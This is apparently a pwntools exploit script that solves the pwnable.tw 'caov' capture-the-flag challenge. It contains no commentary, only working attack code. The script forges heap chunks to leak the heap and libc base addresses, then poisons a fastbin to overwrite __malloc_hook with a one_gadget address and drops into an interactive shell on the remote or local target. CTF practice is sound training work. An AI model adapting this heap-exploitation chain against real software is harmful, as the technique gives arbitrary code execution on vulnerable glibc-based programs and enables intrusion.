from pwn import *

e = ELF("./caov")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10306)
else:
  p = process(e.path, {"LD_PRELOAD": "./libc.so.6"})

p.sendlineafter(":", "A")
p.sendlineafter(":", "A" * (0x28 - 1))
p.sendlineafter(":", "1")

p.sendlineafter("choice:", "2")
p.sendlineafter(":", (
    ((p64(0) + p64(0x71)).ljust(0xb8 - 0x58, "\x00") + p64(0x6032c0 + 0x10)).ljust(0x78, "\x00") + "\x21"
))

p.sendlineafter(":", "0")

p.sendlineafter("choice:", "2")
p.sendlineafter(":", "")
p.sendlineafter(":", str(0x68 - 1))
p.sendlineafter(":", "")
p.sendlineafter(":", "1")

p.sendlineafter("choice:", "2")
p.sendlineafter(":", 
    ((p64(0) + p64(0x31)).ljust(0x38, "\x00") + p64(0x21).ljust(0x18, "\x00") + p64(0x30) + p64(0x21)).ljust(0xb8 - 0x58, "\x00") + p64(0x6032c0 + 0x10)
)

p.sendlineafter(":", "0")

p.recvuntil("data info after")
p.recvuntil("Key: ")
heap_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0xc10
print("{:#x}".format(heap_base))


p.sendlineafter("choice:", "2")
p.sendlineafter(":", 
    ((p64(0) + p64(0x31) + p64(0x6032c0) + p64(0) + p64(0x31)).ljust(0x38, "\x00") + (p64(0x21)).ljust(0x18, "\x00") + p64(0x31) + p64(0x31)).ljust(0xb8 - 0x58, "\x00") + p64(0) * 4 + p64(0x31) * 2
)

p.sendlineafter(":", str(0x28 - 1))
p.sendlineafter(":", p64(0x6032d8))
p.sendlineafter(":", "1")


p.recvuntil("data info after")
p.recvuntil("Key: ")
libc_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["__malloc_hook"] - 0x10 - 88
print("{:#x}".format(libc_base))


p.sendlineafter("choice:", "2")
p.sendlineafter(":", "")
p.sendlineafter(":", str(0x28 - 1))
p.sendlineafter(":", "")
p.sendlineafter(":", "1")

p.sendlineafter("choice:", "2")
p.sendlineafter(":", "")
p.sendlineafter(":", str(0x28 - 1))
p.sendlineafter(":", "")
p.sendlineafter(":", "1")

p.sendlineafter("choice:", "2")
p.sendlineafter(":", (
    ((p64(0) + p64(0x71)).ljust(0xb8 - 0x58, "\x00") + p64(0x6032c0 + 0x10)).ljust(0x78, "\x00") + "\x11"
))

p.sendlineafter(":", str(0x78 - 1))
p.sendlineafter(":", "A" * (0x68 - 2))
p.sendlineafter(":", "1")

p.sendlineafter("choice:", "2")
p.sendlineafter(":", (
    ((p64(0) + p64(0x71) + 2 * p64(libc_base + libc.symbols["__malloc_hook"] + 0x10 + 88)).ljust(0xb8 - 0x58, "\x00") + p64(0)).ljust(0x78, "\x00") + "\x11"
))
p.sendlineafter(":", "0")

p.sendlineafter("choice:", "2")
p.sendlineafter(":", (
    ((p64(0) + p64(0x71) + p64(libc_base + libc.symbols["__malloc_hook"] - 0x23)).ljust(0xb8 - 0x58, "\x00") + p64(0)).ljust(0x78, "\x00") + "\x11"
))

p.sendlineafter(":", str(0x68 - 1))
p.sendlineafter(":", "A" * 0x13 + p64(libc_base + 0xef6c4))

print("Executing one_gadget")

p.sendlineafter(":", "1")

p.interactive()
